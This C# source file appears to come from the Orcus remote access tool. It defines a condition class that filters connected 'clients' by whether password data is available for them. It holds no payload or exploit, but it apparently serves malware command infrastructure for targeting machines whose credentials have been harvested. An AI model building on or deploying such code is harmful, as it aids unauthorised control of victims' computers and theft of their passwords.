using System;
using Orcus.Shared.Client;
using Orcus.Shared.Connection;

namespace Orcus.Shared.DynamicCommands.Conditions
{
    /// <summary>
    ///     Condition which filters the clients by password availability
    /// </summary>
    [Serializable]
    public class PasswordDataAvailableCondition : Condition
    {
        public bool IsAvailable { get; set; }

        public override string DisplayString => $"Is Password Data Available = {IsAvailable}";
        public override string ConditionType => "Password Data";

        public override bool IsTrue(ClientInformation clientInformation, ClientConfig clientConfig)
        {
            return clientInformation.IsPasswordDataAvailable == IsAvailable;
        }
    }
}